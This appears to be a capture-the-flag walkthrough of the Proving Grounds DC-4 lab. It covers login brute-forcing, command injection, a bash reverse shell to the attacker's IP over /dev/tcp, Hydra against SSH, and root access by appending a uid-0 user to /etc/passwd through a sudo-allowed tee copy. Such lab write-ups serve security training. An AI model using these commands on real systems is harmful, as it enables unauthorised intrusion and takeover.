---
layout: default
title: DC-4
parent: Proving Grounds Play
nav_order: 19
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-4]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.226.195
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-11 20:37 EST
Nmap scan report for 192.168.226.195
Host is up (0.066s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)
|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)
|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)
80/tcp open  http    nginx 1.15.10
|_http-server-header: nginx/1.15.10
|_http-title: System Tools
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.51 seconds

```

# Enumeration

---

## 80 | HTTP

We have a simple logon page.

![index](../../../assets/images/ctfs/proving_grounds/dc_4/index.png)

Intercept a logon attempt in Burp and forward to Intruder.

Add the payload position to the _password_ position.

![payload](../../../assets/images/ctfs/proving_grounds/dc_4/payload.png)

Paste the Seclists Top 10,000 passwords listto the Payload Settings.

[SecLists Top 10,000 Passwords Raw](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt)

Start the attack until we see the attempt with 'happy' result in a unique response header length.

![happy](../../../assets/images/ctfs/proving_grounds/dc_4/happy.png)

Once we stop the attack we can see we are logged on to the attack machine web site admin console.

![login](../../../assets/images/ctfs/proving_grounds/dc_4/login.png)

We have the ability to run commands from the _command.php_ page.

![command](../../../assets/images/ctfs/proving_grounds/dc_4/command.png)

If we send the request to Repeater and alter the _radio_ parameter to run the command _id_ we can see we have RCE.

![radio](../../../assets/images/ctfs/proving_grounds/dc_4/rad.png)

# Exploitation

---

Use _revshellgen_ to generate a bash reverse shell one-liner and URL encode

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-4]
└─$ urlencodebash "bash -i >& /dev/tcp/192.168.45.217/9001 0>&1"
urlencodebash: command not found

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-4]
└─$ urlencode "bash -i >& /dev/tcp/192.168.45.217/9001 0>&1"
bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.217%2F9001%200%3E%261

```

Send the payload using Repeater and get a reverse shell.

![burp](../../../assets/images/ctfs/proving_grounds/dc_4/burp.png)

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-4]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.226.195] 55084
bash: cannot set terminal process group (535): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dc-4:/usr/share/nginx/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@dc-4:/usr/share/nginx/html$

```

# Post-Exploitation

---

## Enumerate Users

```bash
www-data@dc-4:/home$ ls -la
total 20
drwxr-xr-x  5 root    root    4096 Apr  7  2019 .
drwxr-xr-x 21 root    root    4096 Apr  5  2019 ..
drwxr-xr-x  2 charles charles 4096 Apr  7  2019 charles
drwxr-xr-x  3 jim     jim     4096 Nov 12 11:01 jim
drwxr-xr-x  2 sam     sam     4096 Apr  7  2019 sam

```

There is a _old-passwords.bak_ folder that we can read.

```bash
www-data@dc-4:/home/jim$ ls -la
total 36
drwxr-xr-x 3 jim  jim  4096 Nov 12 11:01 .
drwxr-xr-x 5 root root 4096 Apr  7  2019 ..
-rw-r--r-- 1 jim  jim   220 Apr  6  2019 .bash_logout
-rw-r--r-- 1 jim  jim  3526 Apr  6  2019 .bashrc
-rw-r--r-- 1 jim  jim   675 Apr  6  2019 .profile
drwxr-xr-x 2 jim  jim  4096 Apr  7  2019 backups
-rw-r--r-- 1 root root   33 Nov 12 11:01 local.txt
-rw------- 1 jim  jim   528 Apr  6  2019 mbox
-rwsrwxrwx 1 jim  jim   174 Apr  6  2019 test.sh
www-data@dc-4:/home/jim$ cd backups
www-data@dc-4:/home/jim/backups$ ls -la
total 12
drwxr-xr-x 2 jim jim 4096 Apr  7  2019 .
drwxr-xr-x 3 jim jim 4096 Nov 12 11:01 ..
-rw-r--r-- 1 jim jim 2047 Apr  7  2019 old-passwords.bak

```

We copy the passwords to our attack box and run Hydra against the SSH service for the users we enumerated.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-4]
└─$ hydra -L users.txt -P passwords.txt 192.168.226.195 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-11 22:19:14
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 756 login tries (l:3/p:252), ~48 tries per task
[DATA] attacking ssh://192.168.226.195:22/
[STATUS] 171.00 tries/min, 171 tries in 00:01h, 586 to do in 00:04h, 15 active
[22][ssh] host: 192.168.226.195   login: jim   password: jibril04
[STATUS] 139.00 tries/min, 417 tries in 00:03h, 340 to do in 00:03h, 15 active
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.

```

## Pivot to User Jim

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-4]
└─$ ssh jim@192.168.226.195
The authenticity of host '192.168.226.195 (192.168.226.195)' can't be established.
ED25519 key fingerprint is SHA256:0CH/AiSnfSSmNwRAHfnnLhx95MTRyszFXqzT03sUJkk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.226.195' (ED25519) to the list of known hosts.
jim@192.168.226.195's password:
Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Sun Apr  7 02:23:55 2019 from 192.168.0.100
jim@dc-4:~$
```

## Enumerate /var/mail

Checking _/var/mail_ there is a message to read.

```bash
jim@dc-4:~$ cat /var/mail/jim
From charles@dc-4 Sat Apr 06 21:15:46 2019
Return-path: <charles@dc-4>
Envelope-to: jim@dc-4
Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000
Received: from charles by dc-4 with local (Exim 4.89)
        (envelope-from <charles@dc-4>)
        id 1hCjIX-0000kO-Qt
        for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000
To: jim@dc-4
Subject: Holidays
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1hCjIX-0000kO-Qt@dc-4>
From: Charles <charles@dc-4>
Date: Sat, 06 Apr 2019 21:15:45 +1000
Status: O

Hi Jim,

I'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.

Password is:  ^xHhA&hvim0y

See ya,
Charles
```

## Switch to User Charles

```bash
jim@dc-4:~$ su charles

```

## Check Sudo Permissions for Charles

```bash
charles@dc-4:/home/jim$ sudo -l
Matching Defaults entries for charles on dc-4:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on dc-4:
    (root) NOPASSWD: /usr/bin/teehee

```

## Exploit Sudo Permissions on /usr/bin/teehee

According to GTFOBins we can exploit _tee_ which we can check to see if _teehee_ is the same binary.

![gtfobins](../../../assets/images/ctfs/proving_grounds/dc_4/gtfobins.png)

```bash
charles@dc-4:/home/jim$ echo "evil:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:evil:/home/evil:/bin/bash" | sudo /usr/bin/teehee -a /etc/passwd
kamino:$/UTMXpPC/m1P.t9l.:0:0:kamino:/home/kamino:/bin/bash

```

Checking _/etc/passwd_ we have added the _evil_ user with root privileges.

```bash
charles@dc-4:/home/jim$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
messagebus:x:105:109::/var/run/dbus:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
nginx:x:107:111:nginx user,,,:/nonexistent:/bin/false
charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash
jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash
sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash
Debian-exim:x:108:112::/var/spool/exim4:/bin/false
evil:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:evil:/home/evil:/bin/bash

```

We can switch to the Evil user and gain a shell with root privileges.

```bash
charles@dc-4:/home/jim$ su evil
Password:
root@dc-4:/home/jim# id
uid=0(root) gid=0(root) groups=0(root)

```
